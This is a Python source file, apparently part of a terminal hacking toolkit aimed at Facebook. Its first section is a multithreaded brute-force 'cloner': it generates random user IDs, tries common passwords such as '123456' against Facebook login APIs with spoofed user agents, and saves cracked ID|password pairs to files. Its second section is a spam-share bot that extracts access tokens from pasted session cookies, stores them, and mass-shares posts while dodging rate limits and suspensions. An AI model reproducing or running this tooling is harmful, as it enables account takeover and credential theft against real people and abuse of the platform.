    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def fbclone_window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
# (window title set from master menu)



def fbclone_banner():
    os.system('cls' if 'win' in sys.platform else 'clear')
    print("""\033[38;5;196m
  ╔══════════════════════════════════════════════════════════╗
  ║                                                          ║
  ║  \033[1m\033[38;5;196m  ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[38;5;214m          ║
  ║  \033[38;5;196m ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[38;5;214m          ║
  ║  \033[38;5;196m ██║     ██████╔╝███████║██║     █████╔╝ \033[38;5;214m          ║
  ║  \033[38;5;214m ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[38;5;226m          ║
  ║  \033[38;5;214m ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[38;5;226m          ║
  ║  \033[38;5;214m  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[38;5;226m         ║
  ║                                                          ║
  ║  \033[0m\033[38;5;208m\033[1m  [  C R A C K I N G  ]   OLD  ACCOUNT  BRUTE  CLONER    \033[0m\033[38;5;196m  ║
  ║                                                          ║
  ║  \033[0m\033[38;5;196m\033[1m  +---------+   [  B R U T E   F O R C E   E N G I N E  ]  \033[0m\033[38;5;196m║
  ║  \033[38;5;214m  |  FB    |   Series: ALL / 100003-4 / 2009        \033[38;5;196m  ║
  ║  \033[38;5;226m  |  CLONE |   Method: Multi-thread  ·  High Speed   \033[38;5;196m  ║
  ║  \033[38;5;196m  +---------+                                         \033[38;5;196m  ║
  ╚══════════════════════════════════════════════════════════╝\033[0m""")


def fbclone_creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')


def fbclone_linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def fbclone_main():
    """
    Main menu function.
    """
    fbclone_banner()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
    fbclone_linex()
    print('       \x1b[38;5;196m(\x1b[1;37m0\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;245m BACK TO MAIN MENU')
    fbclone_linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        fbclone_old_clone()
    elif __Jihad__ in ('0', 'b', 'B'):
        master_menu(); return
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(1)
        fbclone_main()


def fbclone_old_clone():
    """
    Menu for selecting old account cloning type.
    """
    fbclone_banner()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
    fbclone_linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    fbclone_linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
    fbclone_linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        fbclone_old_One()
    elif _input in ('B', 'b', '02', '2'):
        fbclone_old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        fbclone_old_Tree()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        fbclone_old_clone(); return


def fbclone_old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    fbclone_banner()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
    fbclone_linex()
    fbclone_banner()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    fbclone_linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    fbclone_linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        fbclone_banner()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        fbclone_linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(fbclone_login_1, uid)
            elif meth == 'B':
                pool.submit(fbclone_login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def fbclone_old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    fbclone_banner()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    fbclone_linex()
    fbclone_banner()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    fbclone_linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
    fbclone_linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        fbclone_banner()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        fbclone_linex()
        for uid in user:
            if meth == 'A':
                pool.submit(fbclone_login_1, uid)
            elif meth == 'B':
                pool.submit(fbclone_login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def fbclone_old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    fbclone_banner()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    fbclone_linex()
    fbclone_banner()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    fbclone_linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
    fbclone_linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        fbclone_banner()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMADE BY ETHAN BAYOT!{G}")
        fbclone_linex()
        for uid in user:
            if meth == 'A':
                pool.submit(fbclone_login_1, uid)
            elif meth == 'B':
                pool.submit(fbclone_login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def fbclone_login_1(uid):
    """
    Login attempt method 1.
    """
    global clone_loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mFB-CLONE-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{clone_loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(clone_oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': fbclone_window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mFB-CLONE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{fbclone_creationyear(uid)}")
                open('/sdcard/FB-CLONE-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                clone_oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mFB-CLONE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{fbclone_creationyear(uid)}")
                open('/sdcard/FB-CLONE-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                clone_oks.append(uid)
                break
        clone_loop += 1
    except Exception:
        time.sleep(5)


def fbclone_login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{clone_loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(clone_oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': fbclone_window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mFB-CLONE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{fbclone_creationyear(uid)}")
                    open('/sdcard/FB-CLONE-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    clone_oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mFB-CLONE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{fbclone_creationyear(uid)}")
                    open('/sdcard/FB-CLONE-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    clone_oks.append(uid)
                    break
        except Exception as e:
            pass
    clone_loop += 1

# (fbclone auto-start removed — launched via master_menu)

# ============================================================
#   NIKA / POST SHARER
#   Cookie-Based Facebook Post Share Bot
# ============================================================

 

import requests, os, re, sys, json, time, random, threading, logging
from datetime import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

# Setup logging for errors
logging.basicConfig(filename='errors.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Session object
nika_ses = requests.Session()

# Expanded random user agents for better rotation (more for fresh accounts)
nika_ua_list = [
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.11.118;]",
    "Mozilla/5.0 (Linux; Android 13; Google Pixel 6a Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/340.0.0.15.119;]",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.12.120;]",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.190821.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.13.121;]",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/341.0.0.16.122;]",
    "Mozilla/5.0 (Linux; Android 9; SM-G973F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.10.117;]",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/OPM6.171019.030.B1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.9.116;]",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.8.115;]"
]

# Colored print helper
def nika_color(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def nika_banner():
    os.system("clear")
    print("""\033[38;5;129m
  ╔══════════════════════════════════════════════════════════╗
  ║                                                          ║
  ║  \033[1m\033[38;5;129m  ███████╗██████╗  █████╗ ███╗   ███╗\033[38;5;165m           ║
  ║  \033[38;5;129m  ██╔════╝██╔══██╗██╔══██╗████╗ ████║\033[38;5;165m           ║
  ║  \033[38;5;129m  ███████╗██████╔╝███████║██╔████╔██║\033[38;5;165m           ║
  ║  \033[38;5;165m  ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║\033[38;5;201m           ║
  ║  \033[38;5;165m  ███████║██║     ██║  ██║██║ ╚═╝ ██║\033[38;5;201m           ║
  ║  \033[38;5;165m  ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝\033[38;5;201m           ║
  ║                                                          ║
  ║  \033[0m\033[38;5;213m\033[1m  [  SPAM  SHARE  ]   COOKIE-BASED  POST  SHARE  BOT    \033[0m\033[38;5;129m  ║
  ║                                                          ║
  ║  \033[0m\033[38;5;129m\033[1m  >===[  S I G N A L  B O O S T E R  E N G I N E  ]===>  \033[0m\033[38;5;129m║
  ║  \033[38;5;165m  Multi-Cookie  ·  High Speed  ·  Auto Retry         \033[38;5;129m  ║
  ╚══════════════════════════════════════════════════════════╝\033[0m""")

def nika_about():
    nika_banner()
    print(nika_color("About the Tool:", '96'))  # Cyan
    print(nika_color("This is a Facebook post sharing automation tool.", '93'))  # Yellow
    print(nika_color("It uses cookies and tokens to share posts efficiently.", '93'))
    print(nika_color("Features: Fast sharing with minimal delays, supports multiple cookies.", '93'))
    print(nika_color("Warning: Use responsibly to avoid account suspension.", '91'))  # Red
    input(nika_color("  >> Press Enter to return to menu...", '92'))
    nika_main()

def nika_main():
    while True:
        nika_banner()
        print(nika_color("  [1]  Start Spam Share", '92'))
        print(nika_color("  [2]  About", '92'))
        print(nika_color("  [0]  Back to Main Menu", '91'))
        print(nika_color("-" * 50, '90'))
        choice = input(nika_color("  >> Choose: ", '96')).strip()
        if choice == "1":
            nika_login()
        elif choice == "2":
            nika_about()
        elif choice in ('0', 'q', 'Q'):
            master_menu()
            return
        else:
            print(nika_color("  [!] Invalid choice.", '91'))
            import time as _t; _t.sleep(1)

def nika_login():
    nika_banner()
    print(nika_color("Enter your Facebook cookie(s) below  [supports multiple]", '93'))  # Yellow
    try:
        num_cookies = int(input(nika_color("How many cookies to use? ", '92')))  # Green
    except ValueError:
        print(nika_color("[!] Enter a valid number.", '91'))
        return nika_login()

    tokens = []
    cookies_list = []
    for i in range(num_cookies):
        cookie_input = input(nika_color(f"  Cookie #{i+1}: ", '92'))  # Green input
        cookies = {j.split("=")[0]: j.split("=")[1] for j in cookie_input.split("; ") if "=" in j}

        try:
            data = nika_ses.get("https://business.facebook.com/business_locations", headers={
                "user-agent": random.choice(nika_ua_list),  # Random UA per request
                "referer": "https://www.facebook.com/",
                "host": "business.facebook.com",
                "origin": "https://business.facebook.com",
                "upgrade-insecure-requests": "1",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type": "text/html; charset=utf-8"
            }, cookies=cookies, timeout=10)  # Added timeout to handle errors

            find_token = re.search(r"(EAAG\w+)", data.text)
            if not find_token:
                print(nika_color(f"\n❌ Token extraction failed for cookie {i+1}. Check your cookie.", '91'))
                continue

            token = find_token.group(1)
            tokens.append(token)
            cookies_list.append(cookies)
            print(nika_color(f"\n✅ Token found for cookie {i+1}: {token}", '92'))  # Green

        except Exception as e:
            logging.error(f"Login error for cookie {i+1}: {e}")
            print(nika_color(f"Error with cookie {i+1}: {e}", '91'))

    if not tokens:
        print(nika_color("Walang valid cookies. Try again.", '91'))
        return nika_login()

    with open("tokens.txt", "w") as f:
        json.dump(tokens, f)
    with open("cookies.txt", "w") as f:
        json.dump(cookies_list, f)

    time.sleep(3)
    nika_bot()

def nika_share_post(token, cookie, link, n, start_time, account_shares, failed_accounts):
    if token in failed_accounts:
        return False  # Skip permanently failed accounts
    retries = 20  # Increased retries for fresh accounts and suspension handling
    for attempt in range(retries):
        try:
            ua = random.choice(nika_ua_list)  # Rotate UA aggressively
            # Enhanced handling for video/reel URLs: ensure no errors by using proper API and checks
            if "video" in link.lower() or "reel" in link.lower() or "watch" in link.lower():
                # For videos/reels, use specific headers to avoid errors
                headers = {
                    "authority": "graph.facebook.com",
                    "cache-control": "max-age=0",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": ua,
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site"
                }
            else:
                headers = {
                    "authority": "graph.facebook.com",
                    "cache-control": "max-age=0",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": ua
                }
            post = nika_ses.post(
                f"https://graph.facebook.com/v18.0/me/feed?link={link}&published=0&access_token={token}",
                headers=headers, cookies=cookie, timeout=25  # Increased timeout for fresh accounts
            ).text

            data = json.loads(post)
            if "id" in data:
                elapsed = str(datetime.now() - start_time).split('.')[0]
                target_uid = data["id"].split("_")[0] if "_" in data["id"] else data["id"]
                print(nika_color(f"success sharing with target uid {target_uid}", '1;94'))  # Bold sky blue
                account_shares[token] += 1
                return True  # Success
            elif "error" in data:
                error_msg = data["error"]["message"].lower()
                if any(keyword in error_msg for keyword in ["rate limit", "suspended", "blocked", "checkpoint", "temporarily blocked", "account disabled", "nika_login required"]):
                    logging.error(f"Suspension/block for token {token[:10]}...: {data}")
                    print(nika_color(f"Suspension/block hit for token {token[:10]}..., marking as failed and switching account", '91'))
                    failed_accounts.add(token)  # Disable this account
                    return False
                elif "video" in error_msg or "reel" in error_msg or "content" in error_msg:
                    logging.error(f"Video/reel/content error for token {token[:10]}...: {data}")
